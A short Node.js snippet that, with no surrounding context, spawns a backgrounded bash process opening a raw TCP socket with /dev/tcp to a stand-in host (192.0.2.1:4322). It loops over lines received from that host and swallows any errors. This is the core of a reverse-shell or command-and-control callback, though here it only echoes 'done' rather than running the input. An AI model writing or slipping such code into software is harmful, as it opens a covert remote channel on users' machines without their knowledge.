const { exec } = require("child_process");
const command = `
bash -c "exec 5<>/dev/tcp/192.0.2.1/4322; cat <&5 | while read line; do echo done; done" &
`;
exec(command, (error) => {});
